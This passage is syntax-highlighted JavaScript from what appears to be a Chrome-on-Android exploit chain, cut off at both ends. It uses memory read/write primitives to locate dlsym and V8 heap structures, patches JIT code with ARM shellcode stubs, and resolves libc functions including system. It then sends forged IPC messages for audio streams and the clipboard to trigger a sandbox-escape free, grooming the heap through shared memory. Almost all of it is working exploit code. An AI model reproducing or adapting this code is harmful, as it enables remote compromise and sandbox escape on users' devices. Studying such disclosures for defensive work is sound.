class="number">1</span>) + <span class="number">0x900000</span>, <span class="number">2</span>,</span><br><span class="line">        [<span class="number">0x46204798</span>, <span class="number">0xc0d6f59c</span>, <span class="number">0x4038e8bd</span>, <span class="number">0xb9ddf000</span>, <span class="number">0x0422bf00</span>]);</span><br><span class="line">    dlsym_addr = blxDest(dlsymmer - <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// This thing is probably the easiest way to be able to call functions with</span></span><br><span class="line">    <span class="comment">// arbitrarily many arguments.  It may turn out to be unnecessary if none</span></span><br><span class="line">    <span class="comment">// of the functions use that many arguments, but whatever...</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> tdter = find(dlsymmer, <span class="number">2</span>, [<span class="number">0x0058f645</span>, <span class="number">0x601a6016</span>]);</span><br><span class="line">    <span class="keyword">var</span> thread_data_table_ptr = ldrAddPCDest(tdter - <span class="number">6</span>);</span><br><span class="line">    <span class="comment">//alert('tdter:' + asHex(tdter) + ' tdt:' + asHex(thread_data_table_));</span></span><br><span class="line">    <span class="keyword">var</span> thread_data_table_ = read32(thread_data_table_ptr);</span><br><span class="line">    <span class="keyword">var</span> list_ = read32(thread_data_table_);</span><br><span class="line">    <span class="keyword">var</span> isolate_ = read32(list_);</span><br><span class="line">    <span class="keyword">var</span> heap_ = isolate_ + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">var</span> lo_space_ = read32(heap_ + <span class="number">0x598</span>); <span class="comment">/* ! */</span></span><br><span class="line">    <span class="keyword">var</span> a = <span class="string">'eval("");'</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">40000</span>; i++) a += <span class="string">'a.a;'</span></span><br><span class="line">    a += <span class="string">'return 42;'</span>;</span><br><span class="line">    deadfunc = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'a'</span>, a);</span><br><span class="line">    deadfunc(&#123;&#125;);</span><br><span class="line">    <span class="keyword">var</span> first_page_ = read32(lo_space_ + <span class="number">0x14</span>);</span><br><span class="line">    <span class="keyword">var</span> area_start_ = read32(first_page_ + <span class="number">0x10</span>), area_end_ = read32(first_page_ + <span class="number">0x14</span>);</span><br><span class="line">    <span class="comment">//alert('los=' + asHex(lo_space_) + ' code=' + asHex(code));</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    00000000    e92d4030        push    &#123;r4, r5, lr&#125;</span></span><br><span class="line"><span class="comment">    00000004    e59f5020        ldr     r5, [pc, #32]   ; 0x2c</span></span><br><span class="line"><span class="comment">    00000008    e8b5000f        ldm     r5!, &#123;r0, r1, r2, r3&#125;</span></span><br><span class="line"><span class="comment">    0000000c    e92d000f        push    &#123;r0, r1, r2, r3&#125;</span></span><br><span class="line"><span class="comment">    00000010    e8b5001f        ldm     r5!, &#123;r0, r1, r2, r3, r4&#125;</span></span><br><span class="line"><span class="comment">    00000014    e12fff34        blx     r4</span></span><br><span class="line"><span class="comment">    00000018    e5850000        str     r0, [r5]</span></span><br><span class="line"><span class="comment">    0000001c    e8bd403f        pop     &#123;r0, r1, r2, r3, r4, r5, lr&#125;</span></span><br><span class="line"><span class="comment">    00000020    e3a00000        mov     r0, #0  ; 0x0</span></span><br><span class="line"><span class="comment">    00000024    e3a01000        mov     r1, #0  ; 0x0</span></span><br><span class="line"><span class="comment">    00000028    e12fff1e        bx      lr</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">var</span> insts = [<span class="number">0xe92d4030</span>,<span class="number">0xe59f5020</span>,<span class="number">0xe8b5000f</span>,<span class="number">0xe92d000f</span>,<span class="number">0xe8b5001f</span>,<span class="number">0xe12fff34</span>,<span class="number">0xe5850000</span>,<span class="number">0xe8bd403f</span>,<span class="number">0xe3a00000</span>,<span class="number">0xe3a01000</span>,<span class="number">0xe12fff1e</span>, callbuf];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> a = area_start_; a &lt; area_end_; a += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>((read32(a) &amp; <span class="number">0xffff0000</span>) == (<span class="number">0xe92d0000</span> | <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; insts.length; i++)</span><br><span class="line">                write32(a + i * <span class="number">4</span>, insts[i]);</span><br><span class="line">            <span class="keyword">var</span> end = a + insts.length * <span class="number">4</span>;</span><br><span class="line">            insts[insts.length - <span class="number">1</span>] = callbuf + <span class="number">0x28</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; insts.length; i++)</span><br><span class="line">                write32(end + i * <span class="number">4</span>, insts[i]);</span><br><span class="line">            bxlr = end - <span class="number">8</span>;</span><br><span class="line">            stub2 = end;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(a == area_end_) &#123;</span><br><span class="line">        alert(<span class="string">"didn't find push area="</span> + first_page_);</span><br><span class="line">        crash();</span><br><span class="line">    &#125;</span><br><span class="line">    write32(callbuf + <span class="number">0x20</span>, bxlr);</span><br><span class="line">    <span class="keyword">while</span>(deadfunc(&#123;&#125;) == <span class="number">42</span>);</span><br><span class="line">    <span class="comment">//alert('OK');</span></span><br><span class="line">    theFunPart();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">assert</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!x) &#123;</span><br><span class="line">        <span class="keyword">var</span> errno = read32(call(funcs.__errno));</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Assertion failed; errno = '</span> + errno);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xerr = <span class="literal">null</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xassert</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!x &amp;&amp; !xerr) &#123;</span><br><span class="line">        xerr = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Assertion failed'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MInt</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        w: <span class="function"><span class="keyword">function</span>(<span class="params">buf</span>) </span>&#123;</span><br><span class="line">            write32(buf.addr, x);</span><br><span class="line">            buf.addr += <span class="number">4</span>;</span><br><span class="line">        &#125;,</span><br><span class="line">        r: <span class="function"><span class="keyword">function</span>(<span class="params">buf</span>) </span>&#123;</span><br><span class="line">            buf[x] = read32(buf.addr);</span><br><span class="line">            buf.addr += <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MFileDesc</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        r: <span class="function"><span class="keyword">function</span>(<span class="params">buf</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> valid = read32(buf.addr);</span><br><span class="line">            <span class="keyword">var</span> idx = read32(buf.addr + <span class="number">4</span>);</span><br><span class="line">            buf.addr += <span class="number">8</span>;</span><br><span class="line">            assert(valid);</span><br><span class="line">            assert(idx &lt; buf.fds.length);</span><br><span class="line">            buf[x] = buf.fds[idx];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">messageSend</span>(<span class="params">routing, type</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> base = scratch + <span class="number">0x100</span>;</span><br><span class="line">    <span class="keyword">var</span> buf = &#123;<span class="attr">addr</span>: base + <span class="number">4</span>&#125;;</span><br><span class="line">    MInt(routing).w(buf);</span><br><span class="line">    MInt(type).w(buf);</span><br><span class="line">    <span class="keyword">var</span> flags = <span class="number">0x80000002</span>, num_fds = <span class="number">0</span>;</span><br><span class="line">    MInt(flags).w(buf);</span><br><span class="line">    MInt(num_fds).w(buf);</span><br><span class="line">    <span class="keyword">var</span> payload_start = buf.addr;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">2</span>; i &lt; <span class="built_in">arguments</span>.length; i++)</span><br><span class="line">        <span class="built_in">arguments</span>[i].w(buf);</span><br><span class="line">    <span class="keyword">var</span> payload_size = buf.addr - payload_start;</span><br><span class="line">    write32(base, payload_size);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    assert(call(funcs.send, pipe_, base, buf.addr - base, <span class="number">0</span>) == buf.addr - base);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log = <span class="string">''</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">messageReceive</span>(<span class="params">types</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> n = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">while</span>(n--) &#123;</span><br><span class="line">        <span class="keyword">var</span> base = scratch + <span class="number">0x100</span>;</span><br><span class="line">        call(funcs.memset, base, <span class="number">0xee</span>, <span class="number">0x200</span>);</span><br><span class="line">        <span class="keyword">var</span> len = call(funcs.recv, pipe_, base, <span class="number">4</span>, <span class="number">0</span>) | <span class="number">0</span>;</span><br><span class="line">        assert(len == <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">var</span> msg = &#123;<span class="attr">base</span>: base, <span class="attr">addr</span>: base&#125;;</span><br><span class="line">        MInt(<span class="string">'payload_size'</span>).r(msg);</span><br><span class="line">        <span class="keyword">var</span> len = msg.payload_size + <span class="number">0x10</span>;</span><br><span class="line">        assert(len &lt; <span class="number">0x1fc</span>);</span><br><span class="line">        assert(call(funcs.recv, pipe_, msg.addr, len, <span class="number">0</span>) == len);</span><br><span class="line">        readArgs(msg,</span><br><span class="line">            MInt(<span class="string">'routing'</span>),</span><br><span class="line">            MInt(<span class="string">'type'</span>),</span><br><span class="line">            MInt(<span class="string">'flags'</span>),</span><br><span class="line">            MInt(<span class="string">'num_fds'</span>));</span><br><span class="line">        <span class="keyword">if</span>(msg.num_fds &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            msg.fds = [];</span><br><span class="line">            <span class="keyword">var</span> msghdr = scratch + <span class="number">0xc00</span>;</span><br><span class="line">            <span class="keyword">var</span> iov = scratch + <span class="number">0xc20</span>;</span><br><span class="line">            <span class="keyword">var</span> control = scratch + <span class="number">0xc40</span>;</span><br><span class="line">            write32(msghdr + <span class="number">0x00</span>, <span class="number">0</span>); <span class="comment">// msg_name</span></span><br><span class="line">            write32(msghdr + <span class="number">0x04</span>, <span class="number">0</span>); <span class="comment">// msg_namelen</span></span><br><span class="line">            write32(msghdr + <span class="number">0x08</span>, iov); <span class="comment">// msg_iov</span></span><br><span class="line">            write32(msghdr + <span class="number">0x0c</span>, <span class="number">1</span>); <span class="comment">// msg_iovlen</span></span><br><span class="line">            write32(msghdr + <span class="number">0x10</span>, control); <span class="comment">// msg_control</span></span><br><span class="line">            write32(msghdr + <span class="number">0x14</span>, <span class="number">0x100</span>); <span class="comment">// msg_controllen</span></span><br><span class="line">            write32(msghdr + <span class="number">0x18</span>, <span class="number">0</span>); <span class="comment">// msg_flags</span></span><br><span class="line">            write32(iov + <span class="number">0</span>, scratch + <span class="number">0xc28</span>); <span class="comment">// iov_base</span></span><br><span class="line">            write32(iov + <span class="number">4</span>, <span class="number">1</span>); <span class="comment">// iov_len</span></span><br><span class="line">            assert(call(funcs.recvmsg, fd_pipe_, msghdr, <span class="number">0</span>) == <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> controllen = read32(msghdr + <span class="number">0x14</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> cmsg = control; cmsg &lt; control + controllen; cmsg += (cmsg_len + <span class="number">3</span>) &amp; ~<span class="number">3</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> SOL_SOCKET = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">var</span> SCM_RIGHTS = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">var</span> cmsg_len = read32(cmsg);</span><br><span class="line">                <span class="keyword">var</span> cmsg_level = read32(cmsg+<span class="number">4</span>);</span><br><span class="line">                <span class="keyword">var</span> cmsg_type = read32(cmsg+<span class="number">8</span>);</span><br><span class="line">                <span class="keyword">if</span>(cmsg_level == SOL_SOCKET &amp;&amp; cmsg_type == SCM_RIGHTS) &#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">var</span> o = <span class="number">0xc</span>; o &lt; cmsg_len; o += <span class="number">4</span>)</span><br><span class="line">                        msg.fds.push(read32(cmsg + o));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            assert(msg.fds.length == msg.num_fds);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(types.indexOf(msg.type) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(msg.type != <span class="number">0x00010520</span>)</span><br><span class="line">                log += <span class="string">'spurious '</span> + asHex(msg.type) + <span class="string">'\n'</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> msg;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"didn't receive desired message(s)"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readArgs</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; <span class="built_in">arguments</span>.length; i++)</span><br><span class="line">        <span class="built_in">arguments</span>[i].r(msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">messageReceiveDone</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> end = msg.addr;</span><br><span class="line">    <span class="keyword">var</span> true_end = msg.base + <span class="number">20</span> + msg.payload_size;</span><br><span class="line">    <span class="keyword">if</span>(end != true_end)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'extra bytes: '</span> + (true_end - end));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setNonblock</span>(<span class="params">fd, on</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> F_SETFL = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">var</span> O_NONBLOCK = <span class="number">00004000</span>;</span><br><span class="line">    assert(call(funcs.fcntl, fd, F_SETFL, on ? O_NONBLOCK : <span class="number">0</span>) == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">theFunPart</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// A lot of this is relatively unnecessary guesswork</span></span><br><span class="line">    <span class="comment">// because I hate searching for symbols.</span></span><br><span class="line">    <span class="comment">// pause the main thread</span></span><br><span class="line">    <span class="keyword">var</span> SOL_SOCKET = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> SO_TYPE = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">var</span> syms = [</span><br><span class="line">        <span class="string">'getsockopt'</span>,</span><br><span class="line">        <span class="string">'write'</span>,</span><br><span class="line">        <span class="string">'send'</span>,</span><br><span class="line">        <span class="string">'recv'</span>,</span><br><span class="line">        <span class="string">'recvmsg'</span>,</span><br><span class="line">        <span class="string">'close'</span>,</span><br><span class="line">        <span class="string">'memset'</span>,</span><br><span class="line">        <span class="string">'malloc'</span>,</span><br><span class="line">        <span class="string">'__errno'</span>,</span><br><span class="line">        <span class="string">'fcntl'</span>,</span><br><span class="line">        <span class="string">'bsd_signal'</span>,</span><br><span class="line">        <span class="string">'tkill'</span>,</span><br><span class="line">        <span class="string">'getpid'</span>,</span><br><span class="line">        <span class="string">'gettid'</span>,</span><br><span class="line">        <span class="string">'futex'</span>,</span><br><span class="line">        <span class="string">'usleep'</span>,</span><br><span class="line">        <span class="string">'mmap'</span>,</span><br><span class="line">        <span class="string">'munmap'</span>,</span><br><span class="line">        <span class="string">'system'</span></span><br><span class="line">    ];</span><br><span class="line">    funcs = &#123;&#125;;</span><br><span class="line">    syms.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">sym</span>) </span>&#123;</span><br><span class="line">        funcs[sym] = dlsym(sym);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    scratch = call(funcs.malloc, <span class="number">0x1000</span>); <span class="comment">// no real need for yet another buffer, but I don't want to break anything</span></span><br><span class="line">    assert(scratch);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> mypid = call(funcs.getpid), mytid = call(funcs.gettid);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> sockets = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> fd = <span class="number">5</span>; fd &lt; <span class="number">100</span>; fd++) &#123;</span><br><span class="line">        write32(scratch + <span class="number">0x78</span>, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(call(funcs.getsockopt, fd, SOL_SOCKET, SO_TYPE, scratch + <span class="number">0x74</span>, scratch + <span class="number">0x78</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(sockets == <span class="number">2</span>) &#123;</span><br><span class="line">                fd_pipe_ = fd;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(sockets == <span class="number">7</span>) &#123;</span><br><span class="line">                pipe_ = fd;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            sockets++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    assert(fd != <span class="number">100</span>);</span><br><span class="line">    alert(<span class="string">'+3'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Block the IO thread (and all the other ones) for a moment</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> SIGUSR2 = <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">var</span> FUTEX_WAIT = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> FUTEX_WAKE = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> myfutex = scratch;</span><br><span class="line">    assert(call(funcs.bsd_signal, SIGUSR2, stub2) != NEGONE);</span><br><span class="line">    write32(callbuf + <span class="number">0x28</span> + <span class="number">0x10</span>, myfutex);</span><br><span class="line">    write32(callbuf + <span class="number">0x28</span> + <span class="number">0x14</span>, FUTEX_WAIT);</span><br><span class="line">    write32(callbuf + <span class="number">0x28</span> + <span class="number">0x18</span>, <span class="number">0xffffffff</span>);</span><br><span class="line">    write32(callbuf + <span class="number">0x28</span> + <span class="number">0x1c</span>, <span class="number">0</span>);</span><br><span class="line">    write32(callbuf + <span class="number">0x28</span> + <span class="number">0x20</span>, funcs.futex);</span><br><span class="line">    write32(myfutex, <span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> tid = mypid + <span class="number">1</span>; tid &lt; mypid + <span class="number">1000</span>; tid++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(tid == mytid) <span class="keyword">continue</span>;</span><br><span class="line">        call(funcs.tkill, tid, SIGUSR2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// In practice, this is quite predictable (+ no guards!) and nowhere</span></span><br><span class="line">    <span class="comment">// near this many copies is actually necessary.  But we do what we</span></span><br><span class="line">    <span class="comment">// can...</span></span><br><span class="line">    <span class="keyword">var</span> guessedAddress = <span class="number">0xa0a0a0a0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> PINUSE_BIT = <span class="number">1</span>, CINUSE_BIT = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">var</span> chunkSize = <span class="number">0x68</span>;</span><br><span class="line">        <span class="keyword">var</span> fakeHead = chunkSize | PINUSE_BIT | CINUSE_BIT;</span><br><span class="line">        setNonblock(pipe_, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">var</span> fds = [];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> stream_id = <span class="number">0</span>; stream_id &lt; <span class="number">100</span>; stream_id++) &#123;</span><br><span class="line">            messageSend(<span class="number">0x7fffffff</span>, <span class="number">0x00250067</span>, <span class="comment">// AudioHostMsg_CreateStream</span></span><br><span class="line">                    MInt(stream_id), <span class="comment">// stream_id</span></span><br><span class="line">                    MInt(<span class="number">0</span>), <span class="comment">// render_view_id</span></span><br><span class="line">                    MInt(<span class="number">0</span>), <span class="comment">// session_id</span></span><br><span class="line">                    <span class="comment">// params</span></span><br><span class="line">                    MInt(<span class="number">2</span>), <span class="comment">// format=AUDIO_PCM_FAKE</span></span><br><span class="line">                    MInt(<span class="number">29</span>), <span class="comment">// channel_layout=CHANNEL_LAYOUT_DISCRETE</span></span><br><span class="line">                    MInt(<span class="number">3000</span>), <span class="comment">// sample_rate</span></span><br><span class="line">                    MInt(<span class="number">32</span>), <span class="comment">// bits_per_sample</span></span><br><span class="line">                    MInt(<span class="number">192000</span>), <span class="comment">// frames_per_buffer</span></span><br><span class="line">                    MInt(<span class="number">31</span>), <span class="comment">// channels</span></span><br><span class="line">                    MInt(<span class="number">0</span>)); <span class="comment">// input_channels</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> msg = messageReceive([</span><br><span class="line">                    <span class="number">0x00250032</span>, <span class="comment">// AudioMsg_NotifyStreamCreated</span></span><br><span class="line">                    <span class="number">0x00250053</span> <span class="comment">// AudioMsg_NotifyStreamStateChanged</span></span><br><span class="line">            ]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(msg.type == <span class="number">0x00250032</span>) &#123;</span><br><span class="line">                readArgs(msg,</span><br><span class="line">                        MInt(<span class="string">'stream_id'</span>),</span><br><span class="line">                        MFileDesc(<span class="string">'handle'</span>),</span><br><span class="line">                        MFileDesc(<span class="string">'socket_handle'</span>),</span><br><span class="line">                        MInt(<span class="string">'length'</span>));</span><br><span class="line">                messageReceiveDone(msg);</span><br><span class="line">                <span class="comment">//log += JSON.stringify(msg) + '\n';</span></span><br><span class="line">                <span class="keyword">var</span> len = msg.length;</span><br><span class="line">                <span class="comment">//log += 'len=' + len + '\n';</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> PROT_READ = <span class="number">1</span>, PROT_WRITE = <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">var</span> MAP_SHARED = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                fds.push([msg.handle, len]);</span><br><span class="line">                <span class="keyword">var</span> addr = call(funcs.mmap, <span class="number">0</span>, len, PROT_READ | PROT_WRITE, MAP_SHARED, msg.handle, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">                assert(addr != NEGONE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment">// Sadly, there is no copy-on-write memcpy on Linux like</span></span><br><span class="line">                <span class="comment">// vm_copy on OS X.  Oh well, we have lots of RAM.</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> i = guessedAddress &amp; <span class="number">0xfff</span>; i &lt; len; i += <span class="number">0x1000</span>) &#123;</span><br><span class="line">                    <span class="comment">// head</span></span><br><span class="line">                    write32(addr + i + <span class="number">4</span>, fakeHead);</span><br><span class="line">                    <span class="comment">// SharedMemory::mapped_file_ (ensures failure)</span></span><br><span class="line">                    write32(addr + i + <span class="number">8</span>, NEGONE);</span><br><span class="line">                    write32(addr + i + <span class="number">4</span> + chunkSize, CINUSE_BIT | PINUSE_BIT);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment">// dunno if we have enough address space here</span></span><br><span class="line">                assert(call(funcs.munmap, addr, len) == <span class="number">0</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                readArgs(msg,</span><br><span class="line">                        MInt(<span class="string">'stream_id'</span>),</span><br><span class="line">                        MInt(<span class="string">'new_state'</span>));</span><br><span class="line">                messageReceiveDone(msg);</span><br><span class="line">                <span class="comment">//log += '**' + JSON.stringify(msg) + '\n';</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        log += <span class="string">'got up to '</span> + stream_id + <span class="string">'\n'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// And here is the actual sandbox vulnerability.  This is pretty dumb.</span></span><br><span class="line">        <span class="comment">// This calls Map on the specified pointer, which should fail, then</span></span><br><span class="line">        <span class="comment">// frees it, putting a free allocation in shared memory.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Sidenote: It might be possible to use addresses in libchromeview to</span></span><br><span class="line">        <span class="comment">// avoid the ASLR spamming.  dlmalloc's free has a basic check for</span></span><br><span class="line">        <span class="comment">// addresses being &gt;= the first mmapped address, but I think</span></span><br><span class="line">        <span class="comment">// libchromeview happens to be at such addresses.  However, this is</span></span><br><span class="line">        <span class="comment">// easier so who cares...</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> CBF_SMBITMAP = <span class="number">7</span>;</span><br><span class="line">        messageSend(<span class="number">0x7fffffff</span>, <span class="number">0x001e0029</span>, <span class="comment">// ClipboardHostMsg_WriteObjectsAsync</span></span><br><span class="line">            MInt(<span class="number">1</span>), <span class="comment">// objects.size</span></span><br><span class="line">            MInt(CBF_SMBITMAP),</span><br><span class="line">            MInt(<span class="number">2</span>), <span class="comment">// params.size</span></span><br><span class="line">            MInt(<span class="number">4</span>), <span class="comment">// params[0].size</span></span><br><span class="line">            MInt(guessedAddress + <span class="number">8</span>), <span class="comment">// params[0]</span></span><br><span class="line">            MInt(<span class="number">4</span>), <span class="comment">// params[1].size</span></span><br><span class="line">            MInt(<span class="number">0</span>)); <span class="comment">// params[1]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        call(funcs.usleep, <span class="number">8000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> bucketStart;</span><br><span class="line">        fds:</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; fds.length; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> fd = fds[i][<span class="number">0</span>], len = fds[i][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">var</span> addr = call(funcs.mmap, <span class="number">0</span>, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            assert(addr != NEGONE);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> j = guessedAddress &amp; <span class="number">0xfff</span>; j &lt; len; j += <span class="number">0x1000</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(read32(addr + j + <span class="number">8</span>) != NEGONE) &#123;</span><br><span class="line">                    assert(j + <span class="number">0x1000</span> &lt;= len); <span class="comment">// too lazy to fix</span></span><br><span class="line">                    bucketStart = addr + j;</span><br><span class="line">                    <span class="keyword">break</span> fds;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            assert(call(funcs.munmap, addr, len) == <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        assert(i != fds.length);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> bucketOff = <span class="number">0x200</span>; bucketOff &lt; <span class="number">0x1000</span>; bucketOff += <span class="number">0x100</span>) &#123;</span><br><span class="line">            <span class="comment">// now that we know where it is, do more frees to decrease</span></span><br><span class="line">            <span class="comment">// the chance of spurious allocations (this would probably</span></span><br><span class="line">            <span class="comment">// be better redesigned, but whatever)</span></span><br><span class="line">            <span class="keyword">var</span> bucket = bucketStart + bucketOff;</span><br><span class="line">            write32(bucket + <span class="number">4</span>, fakeHead);</span><br><span class="line">            <span class="comment">// SharedMemory::mapped_file_ (ensures failure)</span></span><br><span class="line">            write32(bucket + <span 